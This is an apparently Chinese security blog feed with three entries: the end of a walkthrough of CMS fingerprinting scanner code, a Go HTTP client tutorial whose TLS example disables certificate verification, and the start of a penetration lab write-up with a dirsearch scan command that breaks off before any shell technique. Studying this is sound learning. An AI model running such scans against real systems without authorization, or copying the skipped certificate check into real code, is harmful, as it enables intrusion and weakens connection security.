class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_cms_with_file</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    根据 cms.txt 检测cms</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> self.is_finish:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> self.g_index &gt;= <span class="hljs-built_in">len</span>(self.cms):<br>            self.lock.acquire()<br>            self.is_finish = <span class="hljs-literal">True</span><br>            self.info[<span class="hljs-string">&#x27;cms_name&#x27;</span>] = <span class="hljs-string">&quot;Not Found&quot;</span><br>            self.info[<span class="hljs-string">&#x27;path&#x27;</span>] = <span class="hljs-string">&quot;nothing&quot;</span><br>            self.info[<span class="hljs-string">&#x27;match_pattern&#x27;</span>] = <span class="hljs-string">&quot;nothing&quot;</span><br>            self.lock.release()<br>            <span class="hljs-keyword">break</span><br>        self.lock.acquire()<br>        <span class="hljs-keyword">try</span>:<br>            eachline = self.cms[self.g_index]<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">break</span><br>        self.g_index += <span class="hljs-number">1</span><br>        self.lock.release()<br>        <span class="hljs-comment"># 获取 path 类的数据记录</span><br>        finger_id,cms_name,path,match_pattern,options,hit = eachline[<span class="hljs-number">0</span>],eachline[<span class="hljs-number">1</span>],eachline[<span class="hljs-number">2</span>],eachline[<span class="hljs-number">3</span>],eachline[<span class="hljs-number">4</span>],eachline[<span class="hljs-number">5</span>]<br><br>        url = self.target + path<br>        <span class="hljs-comment"># print self.g_index,url</span><br>        response_html,response_content = WhatCms.request_url(url)<br><br>        <span class="hljs-keyword">if</span> options == <span class="hljs-string">&quot;md5&quot;</span>:<br>            <span class="hljs-keyword">if</span> match_pattern == getMD5(response_content):<br>                self.lock.acquire()<br>                self.is_finish = <span class="hljs-literal">True</span><br>                self.info[<span class="hljs-string">&#x27;finger_id&#x27;</span>]= finger_id<br>                self.info[<span class="hljs-string">&#x27;cms_name&#x27;</span>]=cms_name<br>                self.info[<span class="hljs-string">&#x27;path&#x27;</span>] = path<br>                self.info[<span class="hljs-string">&#x27;match_pattern&#x27;</span>]=match_pattern<br>                self.info[<span class="hljs-string">&#x27;options&#x27;</span>]=options<br>                self.info[<span class="hljs-string">&#x27;hit&#x27;</span>]=hit<br>                self.lock.release()<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">elif</span> options == <span class="hljs-string">&quot;keyword&quot;</span>:<br>            <span class="hljs-keyword">if</span> match_pattern.lower() <span class="hljs-keyword">in</span> response_html.lower():<br>                self.lock.acquire()<br>                self.is_finish = <span class="hljs-literal">True</span><br>                self.info[<span class="hljs-string">&#x27;finger_id&#x27;</span>]= finger_id<br>                self.info[<span class="hljs-string">&#x27;cms_name&#x27;</span>]=cms_name<br>                self.info[<span class="hljs-string">&#x27;path&#x27;</span>] = path<br>                self.info[<span class="hljs-string">&#x27;match_pattern&#x27;</span>]=match_pattern<br>                self.info[<span class="hljs-string">&#x27;options&#x27;</span>]=options<br>                self.info[<span class="hljs-string">&#x27;hit&#x27;</span>]=hit<br>                self.lock.release()<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> options == <span class="hljs-string">&quot;regx&quot;</span>:<br>            r = re.search(match_pattern, response_html)<br>            <span class="hljs-keyword">if</span> r:<br>                self.lock.acquire()<br>                self.is_finish = <span class="hljs-literal">True</span><br>                self.info[<span class="hljs-string">&#x27;finger_id&#x27;</span>]= finger_id<br>                self.info[<span class="hljs-string">&#x27;cms_name&#x27;</span>]=cms_name<br>                self.info[<span class="hljs-string">&#x27;path&#x27;</span>] = path<br>                self.info[<span class="hljs-string">&#x27;match_pattern&#x27;</span>]=match_pattern<br>                self.info[<span class="hljs-string">&#x27;options&#x27;</span>]=options<br>                self.info[<span class="hljs-string">&#x27;hit&#x27;</span>]=hit<br>                self.lock.release()<br>                <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>这个就是去请求所有的 path，然后根据 options 选择合适的指纹识别方法，如 md5、keyword、regx：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308191732544.png" alt="image-20230819173223415"></p><p>指纹识别结束之后是有一个命中率的调整的，就是通过该 path 及 match_pattern 识别出指纹后，就将 hit + 1，这个是在 get_result()  方法完成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_result</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> self.is_finish:<br>            <span class="hljs-comment"># print &quot;self.info:&quot;,self.info</span><br>            <span class="hljs-keyword">if</span> self.info[<span class="hljs-string">&#x27;cms_name&#x27;</span>] != <span class="hljs-string">&#x27;Not Found&#x27;</span>:<br>                <span class="hljs-keyword">try</span>:<br>                    lock.acquire()<br>                    sqlconn=sqlite3.connect(self.file_path)<br>                    sqlcursor=sqlconn.cursor()<br>                    sqlcursor.execute(<span class="hljs-string">&#x27;update cms set hit =? where finger_id = ?&#x27;</span>,(self.info[<span class="hljs-string">&#x27;hit&#x27;</span>]+<span class="hljs-number">1</span>,self.info[<span class="hljs-string">&#x27;finger_id&#x27;</span>]))<br>                    sqlcursor.close()<br>                    sqlconn.commit()<br>                    sqlconn.close()<br>                    lock.release()<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">return</span> self.info<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>到这里指纹识别就完成了。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>源码学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>源码学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go HTTP 请求</title>
    <link href="/2023/08/19/%E7%88%AC%E8%99%AB/GoHTTP%E8%AF%B7%E6%B1%82/"/>
    <url>/2023/08/19/%E7%88%AC%E8%99%AB/GoHTTP%E8%AF%B7%E6%B1%82/</url>
    
    <content type="html"><![CDATA[<h1 id="Go-HTTP-请求"><a href="#Go-HTTP-请求" class="headerlink" title="Go HTTP 请求"></a>Go HTTP 请求</h1><p>Go 语言提供了 net&#x2F;http 包，协助用户实施与 HTTP 协议相关的开发任务。该包既提供了 HTTP 服务器 实现，又提供了 客户端 实现。这里记录使用 Go发起 http 请求。</p><p> net&#x2F;http：<a href="https://studygolang.com/static/pkgdoc/pkg/net_http.htm">https://studygolang.com/static/pkgdoc/pkg/net_http.htm</a></p><h2 id="http-Response"><a href="#http-Response" class="headerlink" title="http.Response"></a>http.Response</h2><p>Response 是 HTTP 请求后的响应，下面是我们可以从中获取到的内容：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308191045617.png" alt="image-20230819104523522" style="zoom:67%;" /><p>读取 Body 信息，需要注意的是 ：对 Body 的处理需要在其未关闭完之前进行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetReqBody</span><span class="hljs-params">(url <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br>body, err := io.ReadAll(resp.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-type">string</span>(body), <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>Header 结构体方法：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308191106301.png" alt="image-20230819110642269" style="zoom:67%;" /><h2 id="Get-请求"><a href="#Get-请求" class="headerlink" title="Get 请求"></a>Get 请求</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>url := <span class="hljs-string">&quot;https://httpbin.org/get&quot;</span><br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br>body, err := io.ReadAll(resp.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>fmt.Println(<span class="hljs-type">string</span>(body))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Post-请求"><a href="#Post-请求" class="headerlink" title="Post 请求"></a>Post 请求</h2><p>Post 请求可以使用 http.Post 或者 http.PostForm 方法，使用方法如下：</p><p> http.Post 方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Post</span><span class="hljs-params">(url <span class="hljs-type">string</span>, bodyType <span class="hljs-type">string</span>, body io.Reader)</span></span> (resp Response, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>url := <span class="hljs-string">&quot;https://httpbin.org/post&quot;</span><br>payload := []<span class="hljs-type">byte</span>(<span class="hljs-string">`&#123;&quot;key&quot;: &quot;value&quot;&#125;`</span>)<br><br>resp, err := http.Post(url, <span class="hljs-string">&quot;application/json&quot;</span>, bytes.NewBuffer(payload))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><br>body, err := ioutil.ReadAll(resp.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br>fmt.Println(<span class="hljs-type">string</span>(body))<br>&#125;<br></code></pre></td></tr></table></figure><p> http.PostForm 方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PostForm</span><span class="hljs-params">(url <span class="hljs-type">string</span>, data url.Values)</span></span> (resp Response, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>targetUrl := <span class="hljs-string">&quot;https://httpbin.org/post&quot;</span><br>values := url.Values&#123;<br><span class="hljs-string">&quot;key1&quot;</span>: &#123;<span class="hljs-string">&quot;value1&quot;</span>&#125;,<br><span class="hljs-string">&quot;key2&quot;</span>: &#123;<span class="hljs-string">&quot;value2&quot;</span>&#125;,<br>&#125;<br>resp, err := http.PostForm(targetUrl, values)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><br>body, err := io.ReadAll(resp.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br>fmt.Println(<span class="hljs-type">string</span>(body))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="HTTP-Client"><a href="#HTTP-Client" class="headerlink" title="HTTP Client"></a>HTTP Client</h2><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Client <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-comment">// Transport指定执行独立、单次HTTP请求的机制。</span><br>    Transport RoundTripper<br>    <span class="hljs-comment">// 重定向</span><br>    CheckRedirect <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req Request, via []Request)</span></span> <span class="hljs-type">error</span><br>    <span class="hljs-comment">// Jar指定cookie管理器, 如果 Jar 为nil，请求中不会发送cookie，回复中的cookie会被忽略。</span><br>    Jar CookieJar<br><span class="hljs-comment">// 超时</span><br>    Timeout time.Duration<br>&#125;<br></code></pre></td></tr></table></figure><p>Client 的 Transport 字段一般会含有内部状态（缓存 TCP 连接），因此 Client 类型值应尽量被重用而不是每次需要都创建新的。</p><p>Client 的 Transport 类型都可以安全的被多个 go 程同时使用。出于效率考虑，应该一次建立、尽量重用。</p><h3 id="Transport"><a href="#Transport" class="headerlink" title="Transport"></a>Transport</h3><h4 id="struct-1"><a href="#struct-1" class="headerlink" title="struct"></a>struct</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Transport <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-comment">// Proxy指定一个对给定请求返回代理的函数。</span><br>    <span class="hljs-comment">// 如果该函数返回了非nil的错误值，请求的执行就会中断并返回该错误。</span><br>    <span class="hljs-comment">// 如果Proxy为nil或返回nil的URL置，将不使用代理。</span><br>    Proxy <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(Request)</span></span> (url.URL, <span class="hljs-type">error</span>)<br>    <span class="hljs-comment">// Dial指定创建TCP连接的拨号函数。如果Dial为nil，会使用net.Dial。</span><br>    Dial <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(network, addr <span class="hljs-type">string</span>)</span></span> (net.Conn, <span class="hljs-type">error</span>)<br>    <span class="hljs-comment">// TLSClientConfig指定用于tls.Client的TLS配置信息。</span><br>    <span class="hljs-comment">// 如果该字段为nil，会使用默认的配置信息。</span><br>    TLSClientConfig tls.Config<br>    <span class="hljs-comment">// TLSHandshakeTimeout指定等待TLS握手完成的最长时间。零值表示不设置超时。</span><br>    TLSHandshakeTimeout time.Duration<br>    <span class="hljs-comment">// 如果DisableKeepAlives为真，会禁止不同HTTP请求之间TCP连接的重用。</span><br>    DisableKeepAlives <span class="hljs-type">bool</span><br>    <span class="hljs-comment">// 如果DisableCompression为真，会禁止Transport在请求中没有Accept-Encoding头时，</span><br>    <span class="hljs-comment">// 主动添加&quot;Accept-Encoding: gzip&quot;头，以获取压缩数据。</span><br>    <span class="hljs-comment">// 如果Transport自己请求gzip并得到了压缩后的回复，它会主动解压缩回复的主体。</span><br>    <span class="hljs-comment">// 但如果用户显式的请求gzip压缩数据，Transport是不会主动解压缩的。</span><br>    DisableCompression <span class="hljs-type">bool</span><br>    <span class="hljs-comment">// 如果MaxIdleConnsPerHost!=0，会控制每个主机下的最大闲置连接。</span><br>    <span class="hljs-comment">// 如果MaxIdleConnsPerHost==0，会使用DefaultMaxIdleConnsPerHost。</span><br>    MaxIdleConnsPerHost <span class="hljs-type">int</span><br>    <span class="hljs-comment">// ResponseHeaderTimeout指定在发送完请求（包括其可能的主体）之后，</span><br>    <span class="hljs-comment">// 等待接收服务端的回复的头域的最大时间。零值表示不设置超时。</span><br>    <span class="hljs-comment">// 该时间不包括获取回复主体的时间。</span><br>    ResponseHeaderTimeout time.Duration<br>    <span class="hljs-comment">// 内含隐藏或非导出字段</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>targetUrl := <span class="hljs-string">&quot;https://example.com&quot;</span><br><br>tr := &amp;http.Transport&#123;<br>Proxy: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req http.Request)</span></span> (url.URL, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> url.Parse(<span class="hljs-string">&quot;http://your-proxy-server:port&quot;</span>)<br>&#125;,<br>&#125;<br><br>client := &amp;http.Client&#123;<br>Transport: tr,<br>&#125;<br>    <br>resp, err := client.Get(targetUrl)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><br>fmt.Println(<span class="hljs-string">&quot;Response Status:&quot;</span>, resp.Status)<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="TLSClientConfig"><a href="#TLSClientConfig" class="headerlink" title="TLSClientConfig"></a>TLSClientConfig</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>url := <span class="hljs-string">&quot;https://example.com&quot;</span><br><br>tr := &amp;http.Transport&#123;<br>TLSClientConfig: &amp;tls.Config&#123;<br>InsecureSkipVerify: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 跳过证书验证</span><br>&#125;,<br>&#125;<br><br>client := &amp;http.Client&#123;<br>Transport: tr,<br>&#125;<br><br>resp, err := client.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><br>fmt.Println(<span class="hljs-string">&quot;Response Status:&quot;</span>, resp.Status)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Timeout"><a href="#Timeout" class="headerlink" title="Timeout"></a>Timeout</h3><p>http.Get 和 http.Post 都是没有设置超时的，在生产业务需要设置超时时间，以免 goroutine 被超时请求阻塞而停止响应。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> client = &amp;http.Client&#123;<br>    Timeout: time.Second  <span class="hljs-number">5</span>,<br>&#125;<br><br>rsps, err := client.Get(<span class="hljs-string">&quot;http://example.com&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="CheckRedirect"><a href="#CheckRedirect" class="headerlink" title="CheckRedirect"></a>CheckRedirect</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">// 重定向 3 次</span><br>CheckRedirect := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req http.Request, via []http.Request)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(via) &gt;= <span class="hljs-number">3</span> &#123;<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;stopped after 3 redirects&quot;</span>)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>client := &amp;http.Client&#123;<br>CheckRedirect: CheckRedirect,<br>Timeout:       <span class="hljs-number">15</span>  time.Second,<br>&#125;<br>resp, err := client.Get(<span class="hljs-string">&quot;https://httpbin.org/get&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><br>body, err := io.ReadAll(resp.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>fmt.Println(<span class="hljs-type">string</span>(body))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="http-NewRequest"><a href="#http-NewRequest" class="headerlink" title="http.NewRequest"></a>http.NewRequest</h2><p>http.NewRequest 是新建一个请求，然后通过 client.Do 发起请求，对于 Get、Post 来说有更多的操作空间，如自定义 Header、Cookie 等操作。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>client := &amp;http.Client&#123;<br>Timeout: <span class="hljs-number">15</span>  time.Second,<br>&#125;<br>request, err := http.NewRequest(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;https://httpbin.org/get&quot;</span>, <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>request.Header.Add(<span class="hljs-string">&quot;User-Agent&quot;</span>, <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36&quot;</span>)<br>request.AddCookie(&amp;http.Cookie&#123;<br>Name:  <span class="hljs-string">&quot;name&quot;</span>,<br>Value: <span class="hljs-string">&quot;fuyoumingyan&quot;</span>,<br>&#125;)<br>response, err := client.Do(request)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>body, err := io.ReadAll(response.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>fmt.Println(<span class="hljs-type">string</span>(body))<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308191258261.png" alt="image-20230819125808184"></p>]]></content>
    
    
    <categories>
      
      <category>Golang</category>
      
      <category>爬虫</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场-1</title>
    <link href="/2023/08/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/"/>
    <url>/2023/08/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</url>
    
    <content type="html"><![CDATA[<h1 id="红日靶场-1"><a href="#红日靶场-1" class="headerlink" title="红日靶场-1"></a>红日靶场-1</h1><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><table><thead><tr><th>主机</th><th>IP</th><th>身份</th></tr></thead><tbody><tr><td>ubuntu</td><td>43.139.185.135</td><td>攻击机</td></tr><tr><td>win 7</td><td>192.168.254.135、192.168.52.129</td><td>Web 服务器</td></tr><tr><td>win 2003</td><td></td><td>域内成员</td></tr><tr><td>win 2008</td><td></td><td>域控制器</td></tr></tbody></table><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dirsearch</span> -i <span class="hljs-number">200</span>,<span class="hljs-number">300</span>-<span class="hljs-number">399</span> -u http://<span class="hljs-number">192.168.254.135</span>/<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308141808873.png" alt="image-20230814180844651"></p><h2 id="getShell"><a href="#getShell" class="headerlink" title="getShell"></a>getShell</h2><h3 id="phpMyAdmin日志拿Shell"><a href="#phpMyAdmin日志拿Shell" class="headerlink" 